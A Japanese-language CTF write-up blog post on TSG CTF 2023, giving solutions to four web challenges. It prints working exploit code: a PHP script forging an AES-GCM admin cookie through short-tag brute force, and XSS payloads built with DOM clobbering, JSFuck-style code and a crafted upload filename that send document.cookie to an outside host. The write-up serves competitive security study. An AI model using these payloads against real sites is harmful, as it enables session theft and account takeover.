<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>TSG CTF 2023 Writeup</title><meta name=description content><meta name=keywords content><meta property="og:url" content="https://blog.tyage.net/post/2023/2023-11-09/"><meta property="og:type" content="website"><meta property="og:title" content="TSG CTF 2023 Writeup"><meta property="og:description" content><meta property="og:image" content="https://blog.tyage.net/icon/icon.jpg"><meta property="og:image:secure_url" content="https://blog.tyage.net/icon/icon.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="TSG CTF 2023 Writeup"><meta name=twitter:description content><meta property="twitter:domain" content="https://blog.tyage.net/post/2023/2023-11-09/"><meta property="twitter:url" content="https://blog.tyage.net/post/2023/2023-11-09/"><meta name=twitter:image content="https://blog.tyage.net/icon/icon.jpg"><link rel=canonical href=https://blog.tyage.net/post/2023/2023-11-09/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.96369109b2c1dff7c95fad6026c40711dad5fa859d955dbb9983cb7b018f6fc8.js integrity="sha256-ljaRCbLB3/fJX61gJsQHEdrV+oWdlV27mYPLewGPb8g="></script>
<link rel=webmention href=https://webmention.io/blog.tyage.net/webmention><link rel=pingback href=https://webmention.io/blog.tyage.net/xmlrpc><link rel=stylesheet type=text/css href=/css/style.css><script src=/js/redirect.js></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C64TPJYY96"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C64TPJYY96")</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://blog.tyage.net><img src=/icon/icon.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://blog.tyage.net>blog.tyage.net</a></div><div class=nav-links><div class=nav-link><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></div><div class=nav-link><a href=https://tyage.net><span data-feather=home></span> About me</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target"></span>
<a><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></li><li class=nav-item><a href=https://tyage.net><span data-feather=home></span> About me</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>TSG CTF 2023 Writeup</h1><small role=doc-subtitle></small><p class=post-date>2023/11/09</p><ul class=post-tags></ul></div><div class=post-content><p>TokyoWesternsで参加していて2位でした。
コンテスト終了3分後にabsurdresのフラグが降ってきたので悔しい〜</p><p>以下解いた問題</p><h2 id=upside-down-cake>Upside-down cake</h2><p>1000文字以下の回文を入力できれば勝ち、だがrequest body sizeの制限がかかっており1000文字送りつけることはできない。</p><p><code>string.length &lt; 1000</code> などのチェックを以下のJSONで回避する。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;palindrome&#34;</span>:{<span style=color:#f92672>&#34;length&#34;</span>: <span style=color:#e6db74>&#34;a&#34;</span>,<span style=color:#f92672>&#34;0&#34;</span>:<span style=color:#e6db74>&#34;a&#34;</span>,<span style=color:#f92672>&#34;NaN&#34;</span>:<span style=color:#e6db74>&#34;a&#34;</span>}}
</span></span></code></pre></div><p>FLAG: <code>TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}</code></p><h2 id=dance>#DANCE</h2><p>tagの長さが検証されていない。
以下の記事を見ながらadminのCookieを作る。</p><p><a href=https://www.mbsd.jp/research/20200901/aes-gcm/>https://www.mbsd.jp/research/20200901/aes-gcm/</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$admin <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>;
</span></span><span style=display:flex><span>$guest <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
</span></span><span style=display:flex><span>$xors <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>; <span style=color:#f92672>++</span>$i) {
</span></span><span style=display:flex><span>  $xors[$i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>($admin[$i]) <span style=color:#f92672>^</span> <span style=color:#a6e22e>ord</span>($guest[$i]);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$iv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;pMCoutsCcWDg7gRu&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>$secret = &#39;wakaran&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>$auth = openssl_encrypt(&#39;guest&#39;, &#39;aes-128-gcm&#39;, $secret, 0, $iv, $tag);
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span><span style=display:flex><span>$auth <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;GEfNr0k=&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$newAuth <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>($auth);
</span></span><span style=display:flex><span>$unpacked <span style=color:#f92672>=</span> <span style=color:#a6e22e>unpack</span>(<span style=color:#e6db74>&#39;C*&#39;</span>, $newAuth);
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>; <span style=color:#f92672>++</span>$i) {
</span></span><span style=display:flex><span>  $unpacked[$i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> $unpacked[$i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>^</span> $xors[$i];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$adminAuth <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#39;C*&#39;</span>, <span style=color:#f92672>...</span>$unpacked));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>256</span>; <span style=color:#f92672>++</span>$i) {
</span></span><span style=display:flex><span>  $tag <span style=color:#f92672>=</span> <span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#39;C*&#39;</span>, $i);
</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>  $res = openssl_decrypt($adminAuth, &#39;aes-128-gcm&#39;, $secret, 0, $iv, $tag);
</span></span></span><span style=display:flex><span><span style=color:#75715e>  if ($res) {
</span></span></span><span style=display:flex><span><span style=color:#75715e>    var_dump($i);
</span></span></span><span style=display:flex><span><span style=color:#75715e>    var_dump($res);
</span></span></span><span style=display:flex><span><span style=color:#75715e>    break;
</span></span></span><span style=display:flex><span><span style=color:#75715e>  }
</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
</span></span><span style=display:flex><span>  $tag <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>($tag);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;curl http://34.84.176.251:8080/mypage.php -H &#39;Cookie: auth=</span><span style=color:#e6db74>$adminAuth</span><span style=color:#e6db74>; iv=</span><span style=color:#e6db74>$iv</span><span style=color:#e6db74>; tag=</span><span style=color:#e6db74>$tag</span><span style=color:#e6db74>&#39; --silent&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>FLAG: <code>TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}</code></p><p>Web問か&mldr;?</p><h2 id=brainfxxk-challenge>Brainfxxk Challenge</h2><p><code>/minify</code> APIを使うと入力文字の <code>>&lt;+-=r[]</code> 以外の文字が消されて出力される。</p><p>HTMLは出力できるがCSPで <code>script-src: 'self'</code> がかかっているので、 <code>/minify</code> APIを使って回避する。</p><p>往年のJSFuck問だがDOM Clobberingのおかげで手でもかける。</p><p><code>location='http://mocos.kitchen:12345/' + document.cookie</code> を作ることを目標にシコシコ書いていく。</p><p>方針:</p><ul><li><code>'name'</code> を作るため、 <code>&lt;a href='name://'></code> を文字列にして1文字目から4文字目を結合</li><li>必要な各種文字列を <code>&lt;a></code> のnameに設定し、 <code>r['name']</code> のようにして読み取る</li><li><code>window.location</code> のかわりに <code>[IFRAME Element].location</code> を代入する。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>rrrrr</span>[
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>r</span>[
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>rrrr</span> <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>  [<span style=color:#a6e22e>r</span> <span style=color:#f92672>+</span> [<span style=color:#a6e22e>rr</span> <span style=color:#f92672>=</span> [] <span style=color:#f92672>==</span> []]][<span style=color:#a6e22e>rr</span> <span style=color:#f92672>=</span> <span style=color:#f92672>+</span><span style=color:#a6e22e>rr</span>][<span style=color:#a6e22e>rr</span>] <span style=color:#f92672>+</span> <span style=color:#75715e>// n
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  [<span style=color:#a6e22e>r</span> <span style=color:#f92672>+</span> []][<span style=color:#a6e22e>rrr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>rr</span>][<span style=color:#f92672>++</span><span style=color:#a6e22e>rrr</span>] <span style=color:#f92672>+</span> <span style=color:#75715e>// a
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  [<span style=color:#a6e22e>r</span> <span style=color:#f92672>+</span> []][<span style=color:#a6e22e>rr</span>][<span style=color:#a6e22e>rrr</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>rrr</span>] <span style=color:#f92672>+</span> <span style=color:#75715e>// m
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  [<span style=color:#a6e22e>r</span> <span style=color:#f92672>+</span> []][<span style=color:#a6e22e>rr</span>][<span style=color:#a6e22e>rrr</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>rrr</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>rrr</span>] <span style=color:#75715e>//e
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  ] <span style=color:#75715e>// &#39;location&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>] <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>rrrrrr</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>rrrrr</span>[<span style=color:#a6e22e>rrrrrr</span>[<span style=color:#a6e22e>rrrr</span>]][<span style=color:#a6e22e>rrrrrrr</span>[<span style=color:#a6e22e>rrrr</span>]] <span style=color:#75715e>// document.cookie
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>location</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>r</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;name://&#39;</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>document</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>rrrrrr</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://mocos.kitchen:12345/&#34;</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>cookie</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>rrrrrrr</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>iframe</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>rrrrr</span>&gt;&lt;/<span style=color:#f92672>iframe</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/minify?code=rrrrr%5b%0d%0a%20%20r%5b%0d%0a%20%20rrrr%20%3d%0d%0a%20%20%5br%20%2b%20%5brr%20%3d%20%5b%5d%20%3d%3d%20%5b%5d%5d%5d%5brr%20%3d%20%2brr%5d%5brr%5d%20%2b%20%2f%2f%20n%0d%0a%20%20%5br%20%2b%20%5b%5d%5d%5brrr%20%3d%20rr%5d%5b%2b%2brrr%5d%20%2b%20%2f%2f%20a%0d%0a%20%20%5br%20%2b%20%5b%5d%5d%5brr%5d%5brrr%20%2b%20rrr%5d%20%2b%20%2f%2f%20m%0d%0a%20%20%5br%20%2b%20%5b%5d%5d%5brr%5d%5brrr%20%2b%20rrr%20%2b%20rrr%5d%20%2f%2fe%0d%0a%20%20%5d%20%2f%2f%20&#39;location&#39;%0d%0a%5d%20%3d%0d%0a%20%20rrrrrr%20%2b%20rrrrr%5brrrrrr%5brrrr%5d%5d%5brrrrrrr%5brrrr%5d%5d%20%2f%2f%20document.cookie&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>FLAG: <code>TSGCTF{u_r_j5fuck_m4573r}</code></p><h2 id=absurdres>absurdres</h2><p>CSP nonceで制限されているXSS問。
レスポンスに含まれている <code>![xxx](...)</code> が <code>&lt;img srcset="..." alt="xxx"></code> に変換されるフィルターが存在する。
アップロードしたファイルを閲覧する画面で、script内に <code>![...](...)</code> を埋め込むことでエラーを出さないようにパズルをしながら関数を実行する。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>        &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>nonce</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;{{csp_nonce()}}&#34;</span>&gt;
</span></span><span style=display:flex><span>            const files = {{files|json|safe}};
</span></span></code></pre></div><p>その他、パズルに必要な要素がいっぱい出てくるがざっと列挙してみるとこんな感じ。</p><ul><li>script内に埋め込めるものとしては画像ファイルのファイル名とその拡張子</li><li>ファイル名部分に使える文字はアルファベットのみなので、 <code>![]().png</code> のようなファイル名はエラーとなるが、 <code>/</code> の前と <code>.</code> と <code>.</code> の間はなんでもOK <code>XXXX/FILENAME.XXXX.XXXX</code> の <code>XXXX</code> の部分にペイロード突っ込めるのでまあまあ自由度はある</li><li>ガチャガチャやってると最後に <code>/assets/images/FILENAME.x2.png</code> がJavaScriptとして評価されるので邪魔してくる。DOM Clobberingでこれがエラーとならないように対策する。</li><li>アップロードファイルの拡張子がpngやjpgでないとPILによって怒られるため、拡張子に攻撃ペイロードを埋め込むことはできなさそうに見えるが、PILに怒られる前にDBにはレコードが登録されているので画像の閲覧画面には遷移できる。アップロードしたファイルのIDはコンテンツのmd5なので推測可能。</li></ul><p>最終的に以下のファイル名のファイルを作ると動作する。</p><pre tabindex=0><code>testx.)bbb![//test.](.png}];&#34;&#34;; id=assets ; name=images `;&#34;&lt;form id=test&gt;${location=(atob(&#39;Ly9tb2Nvcy5raXRjaGVuOjEyMzQ1Lw&#39;)+document[&#39;cookie&#39;])}&lt;input id=x2&gt;&#34;;
</code></pre><p>ファイル名に <code>"</code> とか入っているが、 <code>filename*=utf-8''[URL encoded filename]</code> でOK</p><pre tabindex=0><code>Content-Disposition: form-data; name=&#34;image&#34;; filename*=utf-8&#39;&#39;testx.%29bbb!%5b%2f%2ftest.%5d%28.png%7d%5d%3b%22%22%3b%20id%3dassets%20%3b%20name%3dimages%20%60%3b%22%3cform%20id%3dtest%3e%24%7blocation%3d%28atob%28%27Ly9tb2Nvcy5raXRjaGVuOjEyMzQ1Lw%27%29%2bdocument%5b%27cookie%27%5d%29%7d%3cinput%20id%3dx2%3e%22%3b
Content-Type: image/png
</code></pre><p>FLAG: <code>TSGCTF{1girl, hacker, in front of computer, hooded, in dark room, table, sitting, keyboard, 8k wallpaper, highly detailed, absurdres}</code></p><p><code>navigator.sendBeacon(...)</code> でFLAGをleakさせようとしていたのだけど、なぜか手元のChromeでは動作してAdmin botではうまく行かなかった&mldr;
普通に <code>location=...</code> でFLAG飛ばせば動作した。
終了直前に取り組んだため、手元に環境を用意する暇もなく、もっと早く取り組んでおけばと反省した問題。</p></div><div class=prev-next><div class=prev-post><p><a href=/post/2023/2023-09-03-midnightsun/>&#8592;
Previous:
Midnight Sun CTF 2023 Finals - Obelix</a></p><p class=prev-post-date>September 3, 2023</p></div><div class=next-post><p><a href=/post/2023/2023-12-28-hotel-2023/>Next:
2023年宿泊した宿
&#8594;</a></p><p class=next-post-date>December 28, 2023</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="topFunction()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg><script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function topFunction(){smoothScrollToTop()}function smoothScrollToTop(){const e=()=>{const t=document.documentElement.scrollTop||document.body.scrollTop;t>0&&(window.requestAnimationFrame(e),window.scrollTo(0,t-t/8))};e()}</script><div id=comments><script src=/js/webmention.min.js data-max-webmentions=60 async></script><div id=webmentions></div></div></div></main><footer class=footer><span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>